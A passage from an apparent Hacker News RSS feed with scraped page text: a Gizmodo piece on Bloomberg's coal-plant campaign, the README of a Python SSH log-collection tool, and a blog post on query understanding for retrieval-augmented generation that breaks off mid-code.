href="https://twitter.com/mistymntncop?ref=blog.isosceles.com">@mistymntncop</a> for both their encouragement and huge technical contributions to this post.</p>
                    
                </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[USPS In-Person Identity Proofing (116 pts)]]></title>
            <link>https://faq.usps.com/s/article/USPS-In-Person-Identity-Proofing</link>
            <guid>37600618</guid>
            <pubDate>Thu, 21 Sep 2023 17:06:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://faq.usps.com/s/article/USPS-In-Person-Identity-Proofing">https://faq.usps.com/s/article/USPS-In-Person-Identity-Proofing</a>, See on <a href="https://news.ycombinator.com/item?id=37600618">Hacker News</a></p>
Couldn't get https://faq.usps.com/s/article/USPS-In-Person-Identity-Proofing: Error: unable to verify the first certificate]]></description>
        </item>
        <item>
            <title><![CDATA[Bloomberg Is Throwing $500M at Efforts to Shut Down All U.S. Coal Plants (140 pts)]]></title>
            <link>https://gizmodo.com/michael-bloomberg-500-million-shut-down-coal-plants-1850861082</link>
            <guid>37600484</guid>
            <pubDate>Thu, 21 Sep 2023 16:57:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gizmodo.com/michael-bloomberg-500-million-shut-down-coal-plants-1850861082">https://gizmodo.com/michael-bloomberg-500-million-shut-down-coal-plants-1850861082</a>, See on <a href="https://news.ycombinator.com/item?id=37600484">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Billionaire, philanthropist, and former NYC Mayor Michael Bloomberg <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.bloomberg.org/press/michael-r-bloomberg-doubles-down-with-additional-500m-to-help-end-fossil-fuels-and-usher-in-a-new-era-of-clean-energy-in-the-united-states/#:~:text=Starting%20with%20the%20Beyond%20Coal,plants%2C%20stopping%20the%20expansion%20of&quot;,{&quot;metric25&quot;:1}]]" href="https://www.bloomberg.org/press/michael-r-bloomberg-doubles-down-with-additional-500m-to-help-end-fossil-fuels-and-usher-in-a-new-era-of-clean-energy-in-the-united-states/#:~:text=Starting%20with%20the%20Beyond%20Coal,plants%2C%20stopping%20the%20expansion%20of" target="_blank" rel="noopener noreferrer">announced this week</a></span> that he will invest $500 million into his campaign to shut down coal plants and <!-- -->halve<!-- --> gas use<!-- --> by 2030.</p><div data-video-id="193562" data-monetizable="true" data-position="sidebar" data-video-title="What Is Carbon Capture? With Gizmodo’s Molly Taft | Techmodo" data-video-blog-id="4" data-video-network="gizmodo" data-video-duration="424" data-playlist="193562,195689,195681" data-current="193562"><div><p>What Is Carbon Capture? With Gizmodo’s Molly Taft | Techmodo</p></div><video disablepictureinpicture="" muted="" playsinline="" width="100%" height="100%" crossorigin="anonymous" preload="none"><source data-src="https://vid.kinja.com/prod/193562/193562_240p.mp4" label="240p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/193562/193562_480p.mp4" label="480p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/193562/193562_720p.mp4" label="720p" type="video/mp4"><source data-src="https://vid.kinja.com/prod/193562/193562_1080p.mp4" label="1080p" type="video/mp4"><track kind="captions" label="English" src="https://kinja.com/api/videoupload/caption/19012.vtt" srclang="en"></video><div><ul><li data-label="">Off</li><li data-label="English">English</li></ul></div></div><p>Through the Beyond Carbon campaign, Bloomberg has successfully helped shut down about 70% of all coal plants in the U.S. This new push is intended to shut down the remaining 150 coal plants. The Beyond Carbon initiative also aims to work with a range of local and state organizations to block the construction of new gas plants. </p><p>The financing is intended to support research, including studies and analysis to deliver accurate data to partnering organizations and officials for better decision-making<!-- -->. It will also fund local policy and advocacy, along with litigation brought against power companies. </p><p>According to a press release from Bloomberg Philanthropies, this push to shut down coal-fired<!-- --> power plants will push officials to invest in renewable energy and clean jobs. “Our climate is warming at a breakneck pace, and there’s more urgency than ever to cut emissions from fossil fuels &amp; move the U.S. faster toward a clean energy future,” Bloomberg <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://twitter.com/MikeBloomberg/status/1704629062763692184&quot;,{&quot;metric25&quot;:1}]]" href="https://twitter.com/MikeBloomberg/status/1704629062763692184" target="_blank" rel="noopener noreferrer">tweeted yesterday</a></span>, referring to the recent announcement.</p><p>Several organizations that have worked closely with the Beyond Carbon campaign have lauded Bloomberg’s efforts and financing. “Combatting the climate crisis is the most critical fight of our time,” Ben Jealous, the executive director of the Sierra Club, said in a press release. “We must transition from fossil fuels to clean energy if we want to protect our health, our environment, and our children, and we must do so in a way that empowers local communities and prioritizes environmental justice.”</p><p>When the Beyond Carbon campaign was first launched, the goal was to retire about 30% of coal plants by 2020. But with the support of environmental groups nationwide, and an early $500 million from Bloomberg, the campaign managed to shut down more than half of the nation’s coal plants by 2022, <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.reuters.com/business/energy/michael-bloomberg-pumps-500-million-into-bid-close-all-us-coal-plants-2023-09-20/&quot;,{&quot;metric25&quot;:1}]]" href="https://www.reuters.com/business/energy/michael-bloomberg-pumps-500-million-into-bid-close-all-us-coal-plants-2023-09-20/" target="_blank" rel="noopener noreferrer">Reuters reported</a></span>. </p><p>Bloomberg had long championed environmental and climate causes. When he was the mayor of New York, Bloomberg took the subway regularly—by way of SUV, <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://gothamist.com/news/mayor-bloombergs-subway-commute-not-like-yours&quot;,{&quot;metric25&quot;:1}]]" href="https://gothamist.com/news/mayor-bloombergs-subway-commute-not-like-yours" target="_blank" rel="noopener noreferrer">Gothamist reported back in 2007</a></span>. He also pushed for more biking infrastructure in the city, and the Citi Bike system was launched in 2013.</p><p>Bloomberg has also financed other environmental campaigns, including one to stop new petrochemical plants that produce packaging, plastics, and fertilizers, The New York Times<span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.nytimes.com/2023/09/20/climate/michael-blooomberg-climate-petrochemicals.html&quot;,{&quot;metric25&quot;:1}]]" href="https://www.nytimes.com/2023/09/20/climate/michael-blooomberg-climate-petrochemicals.html" target="_blank" rel="noopener noreferrer"> reported</a></span>. He launched a <span><a data-ga="[[&quot;Embedded Url&quot;,&quot;External link&quot;,&quot;https://www.bloomberg.org/press/michael-r-bloomberg-launches-new-85-million-campaign-to-stop-rapid-rise-of-pollution-from-the-petrochemical-industry-in-the-united-states/&quot;,{&quot;metric25&quot;:1}]]" href="https://www.bloomberg.org/press/michael-r-bloomberg-launches-new-85-million-campaign-to-stop-rapid-rise-of-pollution-from-the-petrochemical-industry-in-the-united-states/" target="_blank" rel="noopener noreferrer">$85 million campaign</a></span> last year to support the new Beyond Petrochemicals campaign with the goal to “block the expansion of more than 120 proposed petrochemical projects” in Louisiana, the Ohio River Valley, and Texas. </p><p><em>Want more climate and environment stories? Check out Earther’s guides to </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/what-s-the-best-way-to-decarbonize-your-home-1847518817&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/what-s-the-best-way-to-decarbonize-your-home-1847518817" target="_blank"><em>decarbonizing your home</em></a></span><em>, </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/how-can-i-divest-from-fossil-fuels-1847774633&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/how-can-i-divest-from-fossil-fuels-1847774633" target="_blank"><em>divesting from fossil fuels</em></a></span><em>, </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/how-to-pack-a-go-bag-climate-disasters-wildfires-floods-1849457027&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/how-to-pack-a-go-bag-climate-disasters-wildfires-floods-1849457027" target="_blank"><em>packing a disaster go bag</em></a></span><em>, and </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/how-can-you-overcome-climate-dread-1847606185&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/how-can-you-overcome-climate-dread-1847606185" target="_blank"><em>overcoming climate dread</em></a></span><em>. And don’t miss our coverage of the </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/ipcc-report-2023-climate-change-paris-agreement-un-1850242687&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/ipcc-report-2023-climate-change-paris-agreement-un-1850242687" target="_blank"><em>latest IPCC climate report</em></a></span><em>, the future of </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/future-of-carbon-dioxide-removal-frontier-project-1848782278&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/future-of-carbon-dioxide-removal-frontier-project-1848782278" target="_blank"><em>carbon dioxide removal</em></a></span><em>, and the un-greenwashed facts on </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/what-is-bioplastic-biodegradable-plant-based-plastic-1848999921&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/what-is-bioplastic-biodegradable-plant-based-plastic-1848999921" target="_blank"><em>bioplastics</em></a></span><em> and </em><span><a data-ga="[[&quot;Embedded Url&quot;,&quot;Internal link&quot;,&quot;https://gizmodo.com/least-recyclable-plastics-1848853267&quot;,{&quot;metric25&quot;:1}]]" href="https://gizmodo.com/least-recyclable-plastics-1848853267" target="_blank"><em>plastic recycling</em></a></span><em>.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: My Single-File Python Script I Used to Replace Splunk in My Startup (257 pts)]]></title>
            <link>https://github.com/Dicklesworthstone/automatic_log_collector_and_analyzer</link>
            <guid>37600019</guid>
            <pubDate>Thu, 21 Sep 2023 16:26:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Dicklesworthstone/automatic_log_collector_and_analyzer">https://github.com/Dicklesworthstone/automatic_log_collector_and_analyzer</a>, See on <a href="https://news.ycombinator.com/item?id=37600019">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" id="user-content-automatically-download-and-analyze-log-files-from-remote-machines" dir="auto"><a href="#automatically-download-and-analyze-log-files-from-remote-machines">Automatically Download and Analyze Log Files from Remote Machines</a></h2>
<p dir="auto">This application is designed to collect and analyze logs from remote machines hosted on Amazon Web Services (AWS) and other cloud hosting services.</p>
<p dir="auto"><strong>Note</strong>: This application was specifically designed for use with Pastel Network's log files. However, it can be easily adapted to work with any log files by modifying the parsing functions, data models, and specifying the location and names of the log files to be downloaded. It is compatible with log files stored in a standard format, where each entry is on a separate line and contains a timestamp, a log level, and a message. The application has been tested with log files several gigabytes in size from dozens of machines and can process all of it in minutes. It is designed for Ubuntu 22.04+, but can be adapted for other Linux distributions.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/Dicklesworthstone/automatic_log_collector_and_analyzer/main/demo_screenshot.png"><img src="https://raw.githubusercontent.com/Dicklesworthstone/automatic_log_collector_and_analyzer/main/demo_screenshot.png" alt="Demo Screenshot:"></a></p>
<h2 tabindex="-1" id="user-content-customization" dir="auto"><a href="#customization">Customization</a></h2>
<p dir="auto">To adapt this application for your own use case, refer to the included sample log files and compare them to the parsing functions in the code. You can also modify the data models to store log entries as desired.</p>
<h2 tabindex="-1" id="user-content-features" dir="auto"><a href="#features">Features</a></h2>
<p dir="auto">The application consists of various Python scripts that perform the following functions:</p>
<ul dir="auto">
<li><strong>Connect to Remote Machines</strong>: Using the boto3 library for AWS instances and an Ansible inventory file for non-AWS instances, the application establishes SSH connections to each remote machine.</li>
<li><strong>Download and Parse Log Files</strong>: Downloads specified log files from each remote machine and parses them. The parsed log entries are then queued for database insertion.</li>
<li><strong>Insert Log Entries into Database</strong>: Uses SQLAlchemy to insert the parsed log entries from the queue into an SQLite database.</li>
<li><strong>Process and Analyze Log Entries</strong>: Processes and analyzes log entries stored in the database, offering functions to find error entries and create views of aggregated data based on specified criteria.</li>
<li><strong>Generate Network Activity Data</strong>: Fetches and processes network activity data from each remote machine.</li>
<li><strong>Expose Database via Web App using Datasette</strong>: Once the database is generated, it can be shared over the web using Datasette.</li>
</ul>
<h2 tabindex="-1" id="user-content-compatibility" dir="auto"><a href="#compatibility">Compatibility</a></h2>
<p dir="auto">The tool is compatible with both AWS-hosted instances and any list of Linux instances stored in a standard Ansible inventory file with the following structure:</p>
<div dir="auto" data-snippet-clipboard-copy-content="all:
  vars:
    ansible_connection: ssh
    ansible_user: ubuntu
    ansible_ssh_private_key_file: /path/to/ssh/key/file.pem
  hosts:
    MyCoolMachine01:
      ansible_host: 1.2.3.41
    MyCoolMachine02:
      ansible_host: 1.2.3.41.19"><pre><span>all</span>:
  <span>vars</span>:
    <span>ansible_connection</span>: <span>ssh</span>
    <span>ansible_user</span>: <span>ubuntu</span>
    <span>ansible_ssh_private_key_file</span>: <span>/path/to/ssh/key/file.pem</span>
  <span>hosts</span>:
    <span>MyCoolMachine01</span>:
      <span>ansible_host</span>: <span>1.2.3.41</span>
    <span>MyCoolMachine02</span>:
      <span>ansible_host</span>: <span>1.2.3.41.19</span></pre></div>
<p dir="auto">(Both can be used seamlessly.)</p>
<h2 tabindex="-1" id="user-content-warning" dir="auto"><a href="#warning">Warning</a></h2>
<p dir="auto">To simplify the code, the tool is designed to delete all downloaded log files and generated databases each time it runs. Consequently, this can consume significant bandwidth depending on your log files' size. However, the design's high level of parallel processing and concurrency allows it to run quickly, even when connecting to dozens of remote machines and downloading hundreds of log files.</p>
<h2 tabindex="-1" id="user-content-usage" dir="auto"><a href="#usage">Usage</a></h2>
<p dir="auto">Designed for Ubuntu 22.04+, first install the requirements:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python3 -m venv venv
source venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install wheel
pip install -r requirements.txt"><pre>python3 -m venv venv
<span>source</span> venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install wheel
pip install -r requirements.txt</pre></div>
<p dir="auto">You will also need to install Redis:</p>
<div dir="auto" data-snippet-clipboard-copy-content="sudo apt install redis -y"><pre>sudo apt install redis -y</pre></div>
<p dir="auto">And install Datasette to expose the results as a website:</p>
<div dir="auto" data-snippet-clipboard-copy-content="sudo apt install pipx -y &amp;&amp; pipx ensurepath &amp;&amp; pipx install datasette"><pre>sudo apt install pipx -y <span>&amp;&amp;</span> pipx ensurepath <span>&amp;&amp;</span> pipx install datasette</pre></div>
<p dir="auto">To run the application every 30 minutes as a cron job, execute:</p>

<p dir="auto">And add the following line:</p>
<div dir="auto" data-snippet-clipboard-copy-content="*/15 * * * * . $HOME/.profile; /home/ubuntu/automatic_log_collector_and_analyzer/venv/bin/python /home/ubuntu/automatic_log_collector_and_analyzer/automatic_log_collector_and_analyzer.py >> /home/ubuntu/automatic_log_collector_and_analyzer/log_$(date +\%Y-\%m-\%dT\%H_\%M_\%S).log 2>&amp;1"><pre><span>*</span>/15 <span>*</span> <span>*</span> <span>*</span> <span>*</span> <span>.</span> <span>$HOME</span>/.profile<span>;</span> /home/ubuntu/automatic_log_collector_and_analyzer/venv/bin/python /home/ubuntu/automatic_log_collector_and_analyzer/automatic_log_collector_and_analyzer.py <span>&gt;&gt;</span> /home/ubuntu/automatic_log_collector_and_analyzer/log_<span><span>$(</span>date +<span>\%</span>Y-<span>\%</span>m-<span>\%</span>dT<span>\%</span>H_<span>\%</span>M_<span>\%</span>S<span>)</span></span>.log <span>2&gt;&amp;1</span></pre></div>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[RAG is more than just embedding search (124 pts)]]></title>
            <link>https://jxnl.github.io/instructor/blog/2023/09/17/rag-is-more-than-just-embedding-search/</link>
            <guid>37599873</guid>
            <pubDate>Thu, 21 Sep 2023 16:18:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jxnl.github.io/instructor/blog/2023/09/17/rag-is-more-than-just-embedding-search/">https://jxnl.github.io/instructor/blog/2023/09/17/rag-is-more-than-just-embedding-search/</a>, See on <a href="https://news.ycombinator.com/item?id=37599873">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-md-component="container">
      
      
        
      
      <main data-md-component="main">
        <div data-md-component="content">
    
    <article>
      
        

  
  



<p>With the advent of large language models (LLM), retrival augmented generation (RAG) has become a hot topic. However throught the past year of <a href="https://jxnl.notion.site/Working-with-me-ec2bb36a5ac048c2a8f6bd888faea6c2?pvs=4">helping startups</a> integrate LLMs into their stack I've noticed that the pattern of taking user queries, embedding them, and directly searching a vector store is effectively demoware.</p>
<div>
<p>What is RAG?</p>
<p>Retrival augmented generation (RAG) is a technique that uses a LLM to generate responses, but uses a search backend to augment the generation, in the past year using text embeddings with a vector databases has been the most popular approach I've seen being socialized.</p>
</div>
<figure>
<p><img alt="RAG" src="https://jxnl.github.io/instructor/blog/img/dumb_rag.png">
  </p>
<figcaption>Simple RAG that embedded the user query and makes a search.</figcaption>
</figure>
<p>So let's kick things off by examining what I like to call the 'Dumb' RAG Model—a basic setup that's more common than you'd think.</p>
<h2 id="the-dumb-rag-model">The 'Dumb' RAG Model</h2>
<p>When you ask a question like, "what is the capital of France?" The RAG 'dumb' model embeds the query and searches in some unopinonated search endpoint. Limited to a single method API like <code>search(query: str) -&gt; List[str]</code>. This is fine for simple queries, since you'd expect words like 'paris is the capital of france' to be in the top results of say, your wikipedia embeddings.</p>
<h3 id="why-is-this-a-problem">Why is this a problem?</h3>
<ul>
<li>
<p><strong>Query-Document Mismatch</strong>: This model assumes that query embedding and the content embedding are similar in the embedding space, which is not always true based on the text you're trying to search over. Only using queries that are semantically similar to the content is a huge limitation!</p>
</li>
<li>
<p><strong>Monolithic Search Backend</strong>: Assumes a single search backend, which is not always the case. You may have multiple search backends, each with their own API, and you want to route the query to vector stores, search clients, sql databases, and more.</p>
</li>
<li>
<p><strong>Limitation of text search</strong>: Restricts complex queries to a single string (<code>{query: str}</code>), sacrificing expressiveness, in using keywords, filters, and other advanced features. For example, <code>what problems did we fix last week</code> that cannot be answered by a simple text search, since documents that contain <code>problem, last week</code> are going to be present at every week.</p>
</li>
<li>
<p><strong>Limited ability to plan</strong>: Assumes that the query is the only input to the search backend, but you may want to use other information to improve the search, like the user's location, or the time of day using the context to rewrite the query. For example, if you present the language model of more context its able to plan a suite of queries to execute to return the best results.</p>
</li>
</ul>
<p>Now let's dive into how we can make it smarter with query understanding. This is where things get interesting.</p>
<h2 id="improving-the-rag-model-with-query-understanding">Improving the RAG Model with Query Understanding</h2>

<p>Ultimately what you want to deploy is a <a href="https://en.wikipedia.org/wiki/Query_understanding">system that understands</a> how to take the query and rewrite it to improve precision and recall. </p>
<figure>
<p><img alt="RAG" src="https://jxnl.github.io/instructor/blog/img/query_understanding.png">
  </p>
<figcaption>Query Understanding system routes to multiple search backends.</figcaption>
</figure>
<p>Not convinced? Let's move from theory to practice with a real-world example. First up, Metaphor Systems.</p>
<h2 id="whats-instructor">Whats instructor?</h2>
<p>Instructor uses Pydantic to simplify the interaction between the programmer and language models via the function calling api..</p>
<ul>
<li><strong>Widespread Adoption</strong>: Pydantic is a popular tool among Python developers.</li>
<li><strong>Simplicity</strong>: Pydantic allows model definition in Python.</li>
<li><strong>Framework Compatibility</strong>: Many Python frameworks already use Pydantic.</li>
</ul>

<p>Take <a href="https://metaphor.systems/">Metaphor Systems</a>, which turns natural language queries into their custom search-optimized query. If you take a look web ui you'll notice that they have an auto-prompt option, which uses function calls to furthur optimize your query using an language model, and turn it into a fully specified metaphor systems query.</p>
<figure>
<p><img alt="Metaphor Systems" src="https://jxnl.github.io/instructor/blog/img/meta.png"></p>
<figcaption>Metaphor Systems UI</figcaption>
</figure>
<p>If we peek under the hood, we can see that the query is actually a complex object, with a date range, and a list of domains to search in. Its actually more complex than this but this is a good start. We can model this structured output in Pydantic using the instructor library</p>
<div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span>class</span> <span>DateRange</span><span>(</span><span>BaseModel</span><span>):</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    <span>start</span><span>:</span> <span>datetime</span><span>.</span><span>date</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    <span>end</span><span>:</span> <span>datetime</span><span>.</span><span>date</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span>class</span> <span>MetaphorQuery</span><span>(</span><span>BaseModel</span><span>):</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    <span>rewritten_query</span><span>:</span> <span>str</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    <span>published_daterange</span><span>:</span> <span>DateRange</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span>domains_allow_list</span><span>:</span> <span>List</span><span>[</span><span>str</span><span>]</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span>async</span> <span>def</span> <span>execute</span><span>():</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>        <span>return</span> <span>await</span> <span>metaphor</span><span>.</span><span>search</span><span>(</span><span>...</span><span>)</span>
</span></code></pre></div>
<p>Note how we model a rewritten query, range of published dates, and a list of domains to search in. This is a powerful pattern allows the user query to be restructured for better performance without the user having to know the details of how the search backend works. </p>
<div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span>import</span> <span>instructor</span> 
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span>import</span> <span>openai</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span># Enables response_model in the openai client</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span>instructor</span><span>.</span><span>patch</span><span>()</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span>query</span> <span>=</span> <span>openai</span><span>.</span><span>ChatCompletion</span><span>.</span><span>create</span><span>(</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    <span>model</span><span>=</span><span>"gpt-4"</span><span>,</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>    <span>response_model</span><span>=</span><span>MetaphorQuery</span><span>,</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>    <span>messages</span><span>=</span><span>[</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>        <span>{</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>            <span>"role"</span><span>:</span> <span>"system"</span><span>,</span> 
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>            <span>"content"</span><span>:</span> <span>"You're a query understanding system for the Metafor Systems search engine. Here are some tips: ..."</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>        <span>},</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>        <span>{</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>            <span>"role"</span><span>:</span> <span>"user"</span><span>,</span> 
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>            <span>"content"</span><span>:</span> <span>"What are some recent developments in AI?"</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>        <span>}</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>    <span>],</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span>)</span>
</span></code></pre></div>
<p><strong>Example Output</strong></p>
<div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span>{</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span>    </span><span>"rewritten_query"</span><span>:</span><span> </span><span>"novel developments advancements ai artificial intelligence machine learning"</span><span>,</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span>    </span><span>"published_daterange"</span><span>:</span><span> </span><span>{</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span>        </span><span>"start"</span><span>:</span><span> </span><span>"2023-09-17"</span><span>,</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span>        </span><span>"end"</span><span>:</span><span> </span><span>"2021-06-17"</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span>    </span><span>},</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span>    </span><span>"domains_allow_list"</span><span>:</span><span> </span><span>[</span><span>"arxiv.org"</span><span>]</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span>}</span>
</span></code></pre></div>
<p>This isn't just about adding some date ranges. It's about nuanced, tailored searches, that is deeply integrated with the backend. Metaphor Systems has a whole suite of other filters and options that you can use to build a powerful search query. They can even use some chain of thought prompting to improve how they use some of these advanced features.</p>
<div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span>class</span> <span>DateRange</span><span>(</span><span>BaseModel</span><span>):</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span>start</span><span>:</span> <span>datetime</span><span>.</span><span>date</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    <span>end</span><span>:</span> <span>datetime</span><span>.</span><span>date</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span>chain_of_thought</span><span>:</span> <span>str</span> <span>=</span> <span>Field</span><span>(</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>        <span>None</span><span>,</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>        <span>description</span><span>=</span><span>"Think step by step to plan what is the best time range to search in"</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span>)</span>
</span></code></pre></div>
<p>Now, let's see how this approach can help model an agent like personal assistant.</p>
<h2 id="case-study-2-personal-assistant">Case Study 2: Personal Assistant</h2>
<p>Another great example of this multiple dispatch pattern is a personal assistant. You might ask, "What do I have today?", from a vague query you might want events, emails, reminders etc. That data will likely exist in multiple backends, but what you want is one unified summary of results. Here you can't assume that text of those documents are all embedded in a search backend. There might be a calendar client, email client, across personal and profession accounts.</p>
<div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span>class</span> <span>ClientSource</span><span>(</span><span>enum</span><span>.</span><span>Enum</span><span>):</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    <span>GMAIL</span> <span>=</span> <span>"gmail"</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span>CALENDAR</span> <span>=</span> <span>"calendar"</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span>class</span> <span>SearchClient</span><span>(</span><span>BaseModel</span><span>):</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span>query</span><span>:</span> <span>str</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span>keywords</span><span>:</span> <span>List</span><span>[</span><span>str</span><span>]</span>
